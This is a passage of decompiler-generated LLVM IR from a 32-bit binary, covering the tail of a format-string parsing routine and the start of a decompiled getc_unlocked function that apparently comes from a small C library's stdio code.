  br i1 %v7_804e8b4, label %dec_label_pc_804e8b6, label %dec_label_pc_804e8be

dec_label_pc_804e8b6:                             ; preds = %dec_label_pc_804e8a9
  %v3_804e8b6 = and i32 %v2_804e88f, 1024
  %v4_804e8b6 = icmp eq i32 %v3_804e8b6, 0
  br i1 %v4_804e8b6, label %dec_label_pc_804e8be, label %dec_label_pc_804e8bb

dec_label_pc_804e8bb:                             ; preds = %dec_label_pc_804e8b6
  %v1_804e8bb = add i32 %v0_804e8f4, -134547935
  store i32 %v1_804e8bb, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e8be

dec_label_pc_804e8be:                             ; preds = %dec_label_pc_804e8a9, %dec_label_pc_804e8b6, %dec_label_pc_804e8bb
  %v0_804e8c7 = phi i32 [ %v1_804e8ab, %dec_label_pc_804e8a9 ], [ %v1_804e8ab, %dec_label_pc_804e8b6 ], [ %v1_804e8bb, %dec_label_pc_804e8bb ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80509d3.122 to i32), i32* %ecx.global-to-local, align 4
  %v2_804e8c7 = add i32 %tmp76, 32
  %v3_804e8c7 = inttoptr i32 %v2_804e8c7 to i32*
  store i32 %v0_804e8c7, i32* %v3_804e8c7, align 4
  %v0_804e8ca.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804e8ce.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e8ca

dec_label_pc_804e8ca:                             ; preds = %dec_label_pc_804e8ca, %dec_label_pc_804e8be
  %v0_804e8ca = phi i32 [ %v1_804e8ca, %dec_label_pc_804e8ca ], [ %v0_804e8ca.pre, %dec_label_pc_804e8be ]
  %v1_804e8ca = add i32 %v0_804e8ca, 1
  store i32 %v1_804e8ca, i32* %ecx.global-to-local, align 4
  %v1_804e8cb = inttoptr i32 %v1_804e8ca to i8*
  %v2_804e8cb = load i8, i8* %v1_804e8cb, align 1
  %v3_804e8cb = sext i8 %v2_804e8cb to i32
  store i32 %v3_804e8cb, i32* %eax.global-to-local, align 4
  %v8_804e8d0 = icmp sgt i32 %v0_804e8ce.pre, %v3_804e8cb
  br i1 %v8_804e8d0, label %dec_label_pc_804e8ca, label %dec_label_pc_804e8d2

dec_label_pc_804e8d2:                             ; preds = %dec_label_pc_804e8ca
  store i32 ptrtoint ([21 x i8]* @global_var_80509dd.121 to i32), i32* @ecx, align 4
  %v1_804e8d9 = add i32 %v0_804e8ca, -134547923
  store i32 %v1_804e8d9, i32* %eax.global-to-local, align 4
  %v2_804e8de = add i32 %v0_804e8ca, add (i32 ptrtoint (i32* @global_var_80509c4.123 to i32), i32 -134547923)
  %v3_804e8de = add i32 %v2_804e8de, %v1_804e8d9
  %v4_804e8de = inttoptr i32 %v3_804e8de to i16*
  %v5_804e8de = load i16, i16* %v4_804e8de, align 2
  %v6_804e8de = sext i16 %v5_804e8de to i32
  store i32 %v6_804e8de, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_804e8d9, 2
  %v3_804e8e6 = add i32 %factor, 134547892
  %v4_804e8e6 = inttoptr i32 %v3_804e8e6 to i16*
  %v5_804e8e6 = load i16, i16* %v4_804e8e6, align 2
  %v6_804e8e6 = sext i16 %v5_804e8e6 to i32
  store i32 %v6_804e8e6, i32* %eax.global-to-local, align 4
  %v1_804e8ee = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e8ee = or i32 %v1_804e8ee, %v6_804e8de
  %v2_804e8f0 = and i32 %v2_804e8ee, %v6_804e8e6
  store i32 %v2_804e8f0, i32* %edx.global-to-local, align 4
  %v0_804e902.pre = load i32, i32* @esi, align 4
  %v0_804e905.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804e8fa

dec_label_pc_804e8f4:                             ; preds = %dec_label_pc_804e8a5
  %v1_804e8f4 = add i32 %v0_804e8f4, 1
  store i32 %v1_804e8f4, i32* @ecx, align 4
  %v1_804e8f5 = inttoptr i32 %v1_804e8f4 to i8*
  %v2_804e8f5 = load i8, i8* %v1_804e8f5, align 1
  %v3_804e8f5 = icmp eq i8 %v2_804e8f5, 0
  %v1_804e8f8 = icmp eq i1 %v3_804e8f5, false
  br i1 %v1_804e8f8, label %dec_label_pc_804e8a5, label %dec_label_pc_804e8fa

dec_label_pc_804e8fa:                             ; preds = %dec_label_pc_804e8f4, %dec_label_pc_804e8d2
  %v0_804e905 = phi i32 [ %v0_804e905.pre, %dec_label_pc_804e8d2 ], [ %storemerge4, %dec_label_pc_804e8f4 ]
  %v0_804e902 = phi i32 [ %v0_804e902.pre, %dec_label_pc_804e8d2 ], [ %v0_804e892, %dec_label_pc_804e8f4 ]
  %v0_804e8fa = phi i32 [ %v2_804e8f0, %dec_label_pc_804e8d2 ], [ %v3_804e8a1, %dec_label_pc_804e8f4 ]
  store i32 %v0_804e8fa, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804e902 = inttoptr i32 %v0_804e902 to i8*
  %v2_804e902 = load i8, i8* %v1_804e902, align 1
  %v3_804e902 = sext i8 %v2_804e902 to i32
  store i32 %v3_804e902, i32* %eax.global-to-local, align 4
  %v2_804e905 = add i32 %tmp76, 4
  %v3_804e905 = inttoptr i32 %v2_804e905 to i32*
  store i32 %v0_804e905, i32* %v3_804e905, align 4
  %v0_804e908 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e908 = load i32, i32* @edx, align 4
  %v2_804e908 = add i32 %v1_804e908, 12
  %v3_804e908 = inttoptr i32 %v2_804e908 to i32*
  store i32 %v0_804e908, i32* %v3_804e908, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_804e90f = load i32, i32* @edx, align 4
  %v1_804e90f = add i32 %v0_804e90f, 28
  %v2_804e90f = inttoptr i32 %v1_804e90f to i32*
  store i32 1, i32* %v2_804e90f, align 4
  %v0_804e916 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e916 = load i32, i32* @edx, align 4
  %v2_804e916 = add i32 %v1_804e916, 8
  %v3_804e916 = inttoptr i32 %v2_804e916 to i32*
  store i32 %v0_804e916, i32* %v3_804e916, align 4
  %v0_804e919 = load i32, i32* %edi.global-to-local, align 4
  %v1_804e923 = and i32 %v0_804e919, -5
  %v0_804e929 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e929 = and i32 %v0_804e929, 3840
  store i32 %v1_804e929, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_804e932 = or i32 %v1_804e929, %v1_804e923
  store i32 %v2_804e932, i32* @edi, align 4
  %v1_804e934 = load i32, i32* @edx, align 4
  %v2_804e934 = add i32 %v1_804e934, 20
  %v3_804e934 = inttoptr i32 %v2_804e934 to i32*
  store i32 48, i32* %v3_804e934, align 4
  %v0_804e937 = load i32, i32* @edi, align 4
  %v1_804e937 = load i32, i32* @edx, align 4
  %v2_804e937 = add i32 %v1_804e937, 16
  %v3_804e937 = inttoptr i32 %v2_804e937 to i32*
  store i32 %v0_804e937, i32* %v3_804e937, align 4
  %v0_804e93a = load i32, i32* @ecx, align 4
  %v1_804e93a = inttoptr i32 %v0_804e93a to i8*
  %v2_804e93a = load i8, i8* %v1_804e93a, align 1
  %v3_804e93a = icmp eq i8 %v2_804e93a, 0
  %v1_804e93d = icmp eq i1 %v3_804e93a, false
  br i1 %v1_804e93d, label %dec_label_pc_804e956, label %dec_label_pc_804e93f

dec_label_pc_804e93f:                             ; preds = %dec_label_pc_804e8fa
  %v0_804e93f = load i32, i32* @esi, align 4
  %v1_804e93f = inttoptr i32 %v0_804e93f to i8*
  %v2_804e93f = load i8, i8* %v1_804e93f, align 1
  %v11_804e93f = icmp eq i8 %v2_804e93f, 109
  %v1_804e942 = icmp eq i1 %v11_804e93f, false
  br i1 %v1_804e942, label %dec_label_pc_804ea48, label %dec_label_pc_804e948

dec_label_pc_804e948:                             ; preds = %dec_label_pc_804e93f
  %v0_804e948 = load i32, i32* @edx, align 4
  %v1_804e948 = add i32 %v0_804e948, 32
  %v2_804e948 = inttoptr i32 %v1_804e948 to i32*
  store i32 20, i32* %v2_804e948, align 4
  %v0_804e94f = load i32, i32* @edx, align 4
  %v1_804e94f = add i32 %v0_804e94f, 28
  %v2_804e94f = inttoptr i32 %v1_804e94f to i32*
  store i32 0, i32* %v2_804e94f, align 4
  br label %dec_label_pc_804e956

dec_label_pc_804e956:                             ; preds = %dec_label_pc_804e8fa, %dec_label_pc_804e948
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_804e9ea, label %dec_label_pc_804e961

dec_label_pc_804e961:                             ; preds = %dec_label_pc_804e956
  store i32 0, i32* %ebp.global-to-local, align 4
  %v3_804e9a2 = add i32 %tmp76, 40
  %v1_804e9db = add i32 %tmp76, 28
  %v2_804e9db = inttoptr i32 %v1_804e9db to i32*
  %v4_804e970 = add i32 %tmp76, 36
  br label %dec_label_pc_804e963

dec_label_pc_804e963:                             ; preds = %dec_label_pc_804e9d6, %dec_label_pc_804e961
  %v0_804e979 = phi i32 [ 0, %dec_label_pc_804e961 ], [ %v1_804e9da, %dec_label_pc_804e9d6 ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804e961 ], [ %stack_var_-88.5, %dec_label_pc_804e9d6 ]
  %v1_804e963 = add i32 %v0_804e979, -2
  %v6_804e963 = sub i32 1, %v0_804e979
  %v7_804e963 = and i32 %v6_804e963, %v0_804e979
  %v8_804e963 = icmp slt i32 %v7_804e963, 0
  %v9_804e963 = icmp eq i32 %v1_804e963, 0
  %v10_804e963 = icmp slt i32 %v1_804e963, 0
  %v3_804e966 = icmp eq i1 %v10_804e963, %v8_804e963
  %v4_804e966 = icmp eq i1 %v9_804e963, false
  %v5_804e966 = and i1 %v4_804e966, %v3_804e966
  br i1 %v5_804e966, label %dec_label_pc_804e979, label %dec_label_pc_804e968

dec_label_pc_804e968:                             ; preds = %dec_label_pc_804e963
  store i32 %tmp76, i32* @edx, align 4
  %v0_804e96c = load i32, i32* @esp, align 4
  %v2_804e96c = mul i32 %v0_804e979, 4
  %v3_804e96c = add i32 %v2_804e96c, 68
  %v4_804e96c = add i32 %v3_804e96c, %v0_804e96c
  %v5_804e96c = inttoptr i32 %v4_804e96c to i32*
  %v6_804e96c = load i32, i32* %v5_804e96c, align 4
  store i32 %v6_804e96c, i32* %eax.global-to-local, align 4
  %v1_804e970 = trunc i32 %v6_804e96c to i8
  %v5_804e970 = add i32 %v4_804e970, %v0_804e979
  %v6_804e970 = inttoptr i32 %v5_804e970 to i8*
  store i8 %v1_804e970, i8* %v6_804e970, align 1
  %v0_804e974 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e974 = urem i32 %v0_804e974, 256
  br label %dec_label_pc_804e982

dec_label_pc_804e979:                             ; preds = %dec_label_pc_804e963
  %v5_804e97b = add i32 %v0_804e979, %stack_var_-32.3
  store i32 %v5_804e97b, i32* %eax.global-to-local, align 4
  %v1_804e97f = add i32 %v5_804e97b, -2
  br label %dec_label_pc_804e982

dec_label_pc_804e982:                             ; preds = %dec_label_pc_804e968, %dec_label_pc_804e979
  %v0_804e995 = phi i32 [ %v1_804e974, %dec_label_pc_804e968 ], [ %v1_804e97f, %dec_label_pc_804e979 ]
  store i32 %v0_804e995, i32* %eax.global-to-local, align 4
  %v5_804e982 = sub i32 %v0_804e995, %stack_var_-88.4
  %v11_804e982 = xor i32 %v0_804e995, %stack_var_-88.4
  %v12_804e982 = xor i32 %v5_804e982, %v0_804e995
  %v13_804e982 = and i32 %v12_804e982, %v11_804e982
  %v14_804e982 = icmp slt i32 %v13_804e982, 0
  %v15_804e982 = icmp eq i32 %v5_804e982, 0
  %v16_804e982 = icmp slt i32 %v5_804e982, 0
  %v3_804e986 = icmp ne i1 %v16_804e982, %v14_804e982
  %v4_804e986 = or i1 %v15_804e982, %v3_804e986
  br i1 %v4_804e986, label %dec_label_pc_804e995, label %dec_label_pc_804e988

dec_label_pc_804e988:                             ; preds = %dec_label_pc_804e982
  %v1_804e988 = add i32 %v0_804e995, -9
  %v6_804e988 = sub i32 8, %v0_804e995
  %v7_804e988 = and i32 %v6_804e988, %v0_804e995
  %v8_804e988 = icmp slt i32 %v7_804e988, 0
  %v9_804e988 = icmp eq i32 %v1_804e988, 0
  %v10_804e988 = icmp slt i32 %v1_804e988, 0
  %v3_804e98b = icmp eq i1 %v10_804e988, %v8_804e988
  %v4_804e98b = icmp eq i1 %v9_804e988, false
  %v5_804e98b = and i1 %v4_804e98b, %v3_804e98b
  br i1 %v5_804e98b, label %dec_label_pc_804ea48, label %dec_label_pc_804e995

dec_label_pc_804e995:                             ; preds = %dec_label_pc_804e988, %dec_label_pc_804e982
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_804e982 ], [ %v0_804e995, %dec_label_pc_804e988 ]
  %v1_804e995 = add i32 %v0_804e995, -1
  store i32 %v1_804e995, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_804e99e = load i32, i32* @esp, align 4
  %v1_804e99e = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e99e = mul i32 %v1_804e99e, 4
  %v3_804e99e = add i32 %v0_804e99e, 80
  %v4_804e99e = add i32 %v3_804e99e, %v2_804e99e
  %v5_804e99e = inttoptr i32 %v4_804e99e to i32*
  %v6_804e99e = load i32, i32* %v5_804e99e, align 4
  store i32 %v6_804e99e, i32* %edi.global-to-local, align 4
  %v2_804e9a2 = mul i32 %v1_804e995, 4
  %v4_804e9a2 = add i32 %v3_804e9a2, %v2_804e9a2
  %v5_804e9a2 = inttoptr i32 %v4_804e9a2 to i32*
  %v6_804e9a2 = load i32, i32* %v5_804e9a2, align 4
  store i32 %v6_804e9a2, i32* @eax, align 4
  %v9_804e9a6 = icmp eq i32 %v6_804e99e, 8
  br i1 %v9_804e9a6, label %dec_label_pc_804e9d6, label %dec_label_pc_804e9ab

dec_label_pc_804e9ab:                             ; preds = %dec_label_pc_804e995
  %v9_804e9ab = icmp eq i32 %v6_804e9a2, 8
  br i1 %v9_804e9ab, label %dec_label_pc_804e9c6, label %dec_label_pc_804e9b0

dec_label_pc_804e9b0:                             ; preds = %dec_label_pc_804e9ab
  %v12_804e9b0 = icmp eq i32 %v6_804e9a2, %v6_804e99e
  br i1 %v12_804e9b0, label %dec_label_pc_804e9c6, label %dec_label_pc_804e9b4

dec_label_pc_804e9b4:                             ; preds = %dec_label_pc_804e9b0
  %v1_804e9b4 = call i32 @_promoted_size(i32 %v1_804e995)
  store i32 %v1_804e9b4, i32* %ebx.global-to-local, align 4
  %v0_804e9bb = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804e9bb, i32* @eax, align 4
  %v1_804e9bd = call i32 @_promoted_size(i32 %v1_804e995)
  store i32 %v1_804e9bd, i32* %eax.global-to-local, align 4
  %v8_804e9c4 = icmp sgt i32 %v1_804e9b4, %v1_804e9bd
  br i1 %v8_804e9c4, label %dec_label_pc_804e9d6, label %dec_label_pc_804e9b4.dec_label_pc_804e9c6_crit_edge

dec_label_pc_804e9b4.dec_label_pc_804e9c6_crit_edge: ; preds = %dec_label_pc_804e9b4
  %v0_804e9ce.pre = load i32, i32* @esp, align 4
  %v1_804e9ce.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804e9c6

dec_label_pc_804e9c6:                             ; preds = %dec_label_pc_804e9b4.dec_label_pc_804e9c6_crit_edge, %dec_label_pc_804e9b0, %dec_label_pc_804e9ab
  %v1_804e9ce = phi i32 [ %v1_804e9ce.pre, %dec_label_pc_804e9b4.dec_label_pc_804e9c6_crit_edge ], [ %v1_804e99e, %dec_label_pc_804e9b0 ], [ %v1_804e99e, %dec_label_pc_804e9ab ]
  %v0_804e9ce = phi i32 [ %v0_804e9ce.pre, %dec_label_pc_804e9b4.dec_label_pc_804e9c6_crit_edge ], [ %v0_804e99e, %dec_label_pc_804e9b0 ], [ %v0_804e99e, %dec_label_pc_804e9ab ]
  store i32 %v1_804e995, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v2_804e9ce = mul i32 %v1_804e9ce, 4
  %v3_804e9ce = add i32 %v0_804e9ce, 80
  %v4_804e9ce = add i32 %v3_804e9ce, %v2_804e9ce
  %v5_804e9ce = inttoptr i32 %v4_804e9ce to i32*
  %v6_804e9ce = load i32, i32* %v5_804e9ce, align 4
  store i32 %v6_804e9ce, i32* %eax.global-to-local, align 4
  store i32 %v6_804e9ce, i32* %v5_804e9a2, align 4
  br label %dec_label_pc_804e9d6

dec_label_pc_804e9d6:                             ; preds = %dec_label_pc_804e9b4, %dec_label_pc_804e995, %dec_label_pc_804e9c6
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804e9da = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e9da = add i32 %v0_804e9da, 1
  store i32 %v1_804e9da, i32* %ebp.global-to-local, align 4
  %v3_804e9db = load i32, i32* %v2_804e9db, align 4
  %v1_804e9de = add i32 %v3_804e9db, 2
  store i32 %v1_804e9de, i32* %eax.global-to-local, align 4
  %v5_804e9e3 = icmp slt i32 %v1_804e9da, %v1_804e9de
  br i1 %v5_804e9e3, label %dec_label_pc_804e963, label %dec_label_pc_804ea11

dec_label_pc_804e9ea:                             ; preds = %dec_label_pc_804e956
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804e9ee = add i32 %tmp76, 38
  %v2_804e9ee = inttoptr i32 %v1_804e9ee to i8*
  store i8 1, i8* %v2_804e9ee, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804e9f7 = add i32 %tmp76, 28
  %v2_804e9f7 = inttoptr i32 %v1_804e9f7 to i32*
  %v3_804e9f7 = load i32, i32* %v2_804e9f7, align 4
  %v2_804e9fa = mul i32 %v3_804e9f7, 4
  %v2_804e9fe = ptrtoint i32* %stack_var_-20 to i32
  %v1_804ea05 = add i32 %tmp76, 40
  store i32 %v1_804ea05, i32* %eax.global-to-local, align 4
  %v3_804ea09 = inttoptr i32 %v1_804ea05 to i16*
  %v4_804ea09 = call i32 @memcpy(i16* %v3_804ea09, i32 %v2_804e9fe, i32 %v2_804e9fa)
  store i32 %v4_804ea09, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ea11

dec_label_pc_804ea11:                             ; preds = %dec_label_pc_804e9d6, %dec_label_pc_804e9ea
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804e9ea ], [ %stack_var_-88.5, %dec_label_pc_804e9d6 ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  store i32 %stack_var_-88.6, i32* %v2_804e6bc, align 4
  %v0_804ea1c = load i32, i32* @ecx, align 4
  %v1_804ea1c = add i32 %v0_804ea1c, 16
  %v2_804ea1c = inttoptr i32 %v1_804ea1c to i8*
  %v3_804ea1c = load i8, i8* %v2_804ea1c, align 1
  %v5_804ea1c = icmp slt i8 %v3_804ea1c, 0
  br i1 %v5_804ea1c, label %dec_label_pc_804ea29, label %dec_label_pc_804ea22

dec_label_pc_804ea22:                             ; preds = %dec_label_pc_804ea11
  %v0_804ea22 = load i32, i32* @esi, align 4
  %v1_804ea22 = add i32 %v0_804ea22, 1
  store i32 %v1_804ea22, i32* %eax.global-to-local, align 4
  %v2_804ea25 = inttoptr i32 %v0_804ea1c to i32*
  store i32 %v1_804ea22, i32* %v2_804ea25, align 4
  br label %dec_label_pc_804ea3c

dec_label_pc_804ea29:                             ; preds = %dec_label_pc_804ea11
  store i32 %v4_804e690, i32* %edx.global-to-local, align 4
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804ea31 = load i32, i32* @esi, align 4
  %v2_804ea31 = sub i32 %v0_804ea31, %v4_804e690
  store i32 %v2_804ea31, i32* %esi.global-to-local, align 4
  %v1_804ea33 = mul i32 %v2_804ea31, 4
  %v2_804ea33 = add i32 %v1_804ea33, 224
  store i32 %v2_804ea33, i32* %eax.global-to-local, align 4
  %v2_804ea3a = load i32, i32* %arg1, align 4
  %v4_804ea3a = add i32 %v2_804ea3a, %v2_804ea33
  store i32 %v4_804ea3a, i32* %arg1, align 4
  br label %dec_label_pc_804ea3c

dec_label_pc_804ea3c:                             ; preds = %dec_label_pc_804ea22, %dec_label_pc_804ea29
  store i32 %tmp76, i32* @edx, align 4
  %v1_804ea40 = add i32 %tmp76, 28
  %v2_804ea40 = inttoptr i32 %v1_804ea40 to i32*
  %v3_804ea40 = load i32, i32* %v2_804ea40, align 4
  store i32 %v3_804ea40, i32* %eax.global-to-local, align 4
  %v1_804ea43 = add i32 %v3_804ea40, 2
  br label %dec_label_pc_804ea4b

dec_label_pc_804ea48:                             ; preds = %dec_label_pc_804e6e1, %dec_label_pc_804e77b, %dec_label_pc_804e7ae, %dec_label_pc_804e829, %dec_label_pc_804e815, %dec_label_pc_804e80c, %dec_label_pc_804e988, %dec_label_pc_804e93f, %dec_label_pc_804e88b
  br label %dec_label_pc_804ea4b

dec_label_pc_804ea4b:                             ; preds = %dec_label_pc_804ea3c, %dec_label_pc_804ea48
  %storemerge6 = phi i32 [ %v1_804ea43, %dec_label_pc_804ea3c ], [ -1, %dec_label_pc_804ea48 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804ea4e = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804ea4e, i32* @ebx, align 4
  store i32 %v0_804e68f, i32* @esi, align 4
  store i32 %v0_804e68e, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %stack_var_-88.6, { 1, 0 }
  uselistorder i32 %v1_804e9da, { 0, 2, 1 }
  uselistorder i32 %v1_804e995, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804e988, { 1, 0 }
  uselistorder i32 %v5_804e982, { 1, 2, 0 }
  uselistorder i32 %v0_804e995, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_804e963, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_804e979, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %v1_804e8f4, { 1, 2, 0 }
  uselistorder i32 %v1_804e8ca, { 1, 2, 0 }
  uselistorder i32 %v0_804e8f4, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804e88f, { 1, 0 }
  uselistorder i32 %v1_804e87e, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_804e887, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_804e871, { 0, 2, 3, 1 }
  uselistorder i32 %v6_804e867, { 1, 0 }
  uselistorder i32 %v1_804e849, { 1, 0 }
  uselistorder i32 %v0_804e867.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_804e82c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804e823, { 1, 2, 0 }
  uselistorder i32 %v0_804e7e9, { 1, 0 }
  uselistorder i32 %v1_804e7db, { 1, 0 }
  uselistorder i32 %v1_804e7d6, { 0, 1, 3, 2 }
  uselistorder i32 %v6_804e7d4, { 2, 0, 1 }
  uselistorder i32 %v0_804e7f6, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_804e791, { 1, 2, 0 }
  uselistorder i32 %v0_804e769, { 0, 1, 2, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_804e75c.lcssa, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_804e755.lcssa, { 0, 1, 2, 3, 5, 8, 7, 4, 6 }
  uselistorder i32 %v2_804e75f, { 1, 2, 0 }
  uselistorder i32 %v6_804e75d, { 0, 2, 1 }
  uselistorder i32 %v1_804e75c, { 0, 2, 3, 1 }
  uselistorder i32 %v3_804e755, { 2, 1, 0 }
  uselistorder i32 %v1_804e74d, { 1, 0 }
  uselistorder i32 %v1_804e755137, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v0_804e745, { 1, 0, 2 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v0_804e738, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v8_804e733, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804e709, { 0, 2, 1 }
  uselistorder i32 %v2_804e6f8, { 1, 0 }
  uselistorder i32 %v0_804e6f6, { 2, 0, 1 }
  uselistorder i32 %v4_804e690, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 1, 20, 19, 18, 17, 16, 15, 14, 13, 0, 2, 3, 4, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 5, 4, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 43, 30, 29, 31, 32, 34, 33, 44, 42, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 224, { 1, 0, 2 }
  uselistorder i32 38, { 1, 0 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -5, { 1, 0 }
  uselistorder i32 -134547923, { 1, 0 }
  uselistorder i32 17, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_80509dd.121 to i32), { 1, 0, 2 }
  uselistorder i32 -2147483648, { 4, 7, 1, 2, 3, 5, 6, 0 }
  uselistorder i32 5, { 1, 2, 9, 3, 8, 11, 12, 13, 0, 7, 4, 5, 10, 6, 14, 15 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32 -48, { 1, 3, 4, 5, 2, 0 }
  uselistorder i32* @global_var_8052038, { 5, 0, 6, 2, 7, 1, 3, 8, 4 }
  uselistorder i32 80, { 5, 6, 7, 8, 9, 10, 1, 0, 2, 3, 4 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804ea4b, { 1, 0 }
  uselistorder label %dec_label_pc_804ea48, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_804ea3c, { 1, 0 }
  uselistorder label %dec_label_pc_804ea11, { 1, 0 }
  uselistorder label %dec_label_pc_804e9d6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e982, { 1, 0 }
  uselistorder label %dec_label_pc_804e956, { 1, 0 }
  uselistorder label %dec_label_pc_804e8be, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e88b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e862, { 1, 0 }
  uselistorder label %dec_label_pc_804e839, { 1, 0 }
  uselistorder label %dec_label_pc_804e800, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804e7a3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e75c, { 1, 0 }
  uselistorder label %dec_label_pc_804e74d, { 1, 0 }
  uselistorder label %dec_label_pc_804e743, { 1, 0 }
  uselistorder label %dec_label_pc_804e72c, { 1, 0 }
  uselistorder label %dec_label_pc_804e72c.outer, { 2, 0, 1 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_2()
  %stack_var_-5 = alloca i8, align 1
  %v0_804ea54 = load i32, i32* @ebx, align 4
  %v4_804ea58 = ptrtoint i16* %tmp to i32
  store i32 %v4_804ea58, i32* @ebx, align 4
  %v1_804ea5c = add i32 %v4_804ea58, 16
  %v2_804ea5c = inttoptr i32 %v1_804ea5c to i32*
  %v3_804ea5c = load i32, i32* %v2_804ea5c, align 4
  %v2_804ea5f = add i32 %v4_804ea58, 24
  %v3_804ea5f = inttoptr i32 %v2_804ea5f to i32*
  %v4_804ea5f = load i32, i32* %v3_804ea5f, align 4
  %v10_804ea5f = icmp ult i32 %v3_804ea5c, %v4_804ea5f
  br i1 %v10_804ea5f, label %dec_label_pc_804eb01, label %dec_label_pc_804ea68

dec_label_pc_804ea68:                             ; preds = %entry
  %v2_804ea68 = load i16, i16* %tmp, align 2
  %v3_804ea68 = zext i16 %v2_804ea68 to i32
  %v1_804ea6b = and i32 %v3_804ea68, 131
  %v6_804ea75 = icmp ugt i32 %v1_804ea6b, 128
  br i1 %v6_804ea75, label %dec_label_pc_804ea8f, label %dec_label_pc_804ea77

dec_label_pc_804ea77:                             ; preds = %dec_label_pc_804ea68
  %v0_804ea77 = load i32, i32* @edx, align 4
  %v6_804ea7f = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_804ea77, i32 %v0_804ea77)
  %v1_804ea87 = icmp eq i32 %v6_804ea7f, 0
  %v1_804ea89 = icmp eq i1 %v1_804ea87, false
  br i1 %v1_804ea89, label %dec_label_pc_804eb26, label %dec_label_pc_804ea77.dec_label_pc_804ea8f_crit_edge

dec_label_pc_804ea77.dec_label_pc_804ea8f_crit_edge: ; preds = %dec_label_pc_804ea77
  %v0_804ea8f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ea8f

